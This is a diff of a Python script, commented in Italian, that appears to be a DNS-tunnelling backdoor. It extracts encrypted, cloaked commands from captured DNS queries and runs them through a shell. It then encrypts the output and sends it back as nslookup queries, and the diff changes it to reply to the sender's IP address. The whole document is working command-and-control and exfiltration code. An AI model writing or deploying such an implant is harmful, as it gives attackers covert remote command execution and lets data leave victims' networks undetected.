@@ -20,7 +20,7 @@ def receive_command():
     subprocess.call(['python', 'pcapCapture.py']) 
     print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
-    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
+    cloakedFile, srcIp = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
     cloaked_command = cloakedFile #"cloaked.payload"
     decloaked_command = "decloaked_command.txt"
@@ -29,12 +29,12 @@ def receive_command():
         if file.read().strip() == "":
             print("No command received.")
             return
-        
+    
     # Decloakificare il comando
     print("Decloakifying...")
     if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
         print("Requesting re-trasmission")
-        send_response('rt')
+        send_response('rt', srcIp)
         receive_command()
 
     # Decrypt command
@@ -48,7 +48,7 @@ def receive_command():
     try:
         # Inviare la risposta crittografata
         time.sleep(1)
-        send_response(subprocess.check_output(command, shell=True).decode('utf-8'))
+        send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp)
 
     except Exception as e:
         print(f"Unrecognized command: {e}")
@@ -59,7 +59,8 @@ def receive_command():
     os.remove(cloaked_command)
     os.remove(decloaked_command)
 
-def send_response(response):
+def send_response(response, dns='localhost'):
+    print('Sender IP:', dns)
     # Cifra la risposta
     encrypted_response = encrypt_message(response, key)
 
@@ -74,7 +75,7 @@ def send_response(response):
     with open(cloaked_response, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
-            subprocess.call(['nslookup', fqdn_str], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
     # Rimuove il file di risposta dopo l'invio
     os.remove(cloaked_response)
